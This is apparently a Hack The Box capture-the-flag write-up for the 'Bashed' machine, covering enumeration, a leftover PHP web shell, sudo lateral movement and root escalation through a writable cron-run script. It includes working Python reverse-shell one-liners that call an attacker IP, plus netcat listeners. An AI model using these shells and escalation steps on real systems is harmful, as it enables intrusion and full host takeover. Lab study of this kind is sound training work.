# HTB - Bashed

## Machine Info

|Field|Details|
|---|---|
|OS|Linux|
|Difficulty|Easy|
|IP|10.129.194.32|
|User flag|`arrexel` home directory|
|Root flag|`/root`|

## Tags

#htb #linux #php #webshell #sudo-misconfiguration #cron #python

---

## Attack Path Overview

```
Nmap → port 80 (Apache)
→ Gobuster → /dev/phpbash.php (interactive web shell)
→ www-data shell
→ sudo -u scriptmanager → lateral move
→ /scripts/test.py writable → root cron job → root shell
```

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 10000 10.129.194.32
```

Only **1 open TCP port**: `80/tcp (HTTP)`

```bash
nmap -sV -sC -p 80 10.129.194.32
```

Apache web server running on Linux.

### Web Enumeration

```bash
gobuster dir -u http://10.129.194.32 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Discovered directory: `/dev`

```bash
curl http://10.129.194.32/dev/
```

Found `phpbash.php` — an interactive PHP web shell left behind by a developer.

---

## Foothold — www-data via phpbash

Navigating to `http://10.129.194.32/dev/phpbash.php` gives an interactive shell running as `www-data`.

```bash
# Verify execution context
whoami
# www-data

# Upgrade to a proper reverse shell
# On attacker machine:
nc -lvnp 4444

# In phpbash:
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.17.240",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

---

## User Flag — arrexel

```bash
cat /home/arrexel/user.txt
```

---

## Lateral Movement — www-data → scriptmanager

Check sudo permissions for `www-data`:

```bash
sudo -l
```

Output:

```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

`www-data` can run any command as `scriptmanager` without a password.

```bash
sudo -u scriptmanager /bin/bash -i
```

Now running as `scriptmanager`.

---

## Privilege Escalation — scriptmanager → root

### Discovering /scripts

```bash
ls -la /
```

`/scripts` directory is owned by `scriptmanager` and inaccessible to `www-data`.

```bash
ls -la /scripts/
```

Contents:

```
-rw-r--r-- 1 scriptmanager scriptmanager  58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root           12 Apr  2 14:00 test.txt
```

`test.py` is owned by `scriptmanager`, but `test.txt` is owned by `root` and recently modified — meaning **root is executing `test.py` via a cron job** every couple of minutes.

```bash
cat /scripts/test.py
```

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

### Exploiting the Cron Job

Since `scriptmanager` owns `test.py`, overwrite it with a reverse shell:

```bash
# On attacker machine:
nc -lvnp 9001

# On victim as scriptmanager:
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.240",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])' > /scripts/test.py
```

Wait 1-2 minutes for cron to execute. Root shell received:

```bash
whoami
# root
```

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **Development artifacts left in production** — `phpbash.php` in `/dev` gave immediate RCE without any credentials
- **Sudo misconfiguration** — `www-data` could run commands as `scriptmanager` without a password, enabling lateral movement
- **Insecure cron job** — root executed a Python script owned by an unprivileged user, allowing trivial privilege escalation via script overwrite
- **Least privilege violations** — both the sudo rule and the cron job could have been avoided with proper access controls

## Credentials

|User|Access Method|
|---|---|
|www-data|phpbash.php web shell (no creds needed)|
|scriptmanager|`sudo -u scriptmanager /bin/bash` as www-data|
|root|cron job executing attacker-controlled test.py|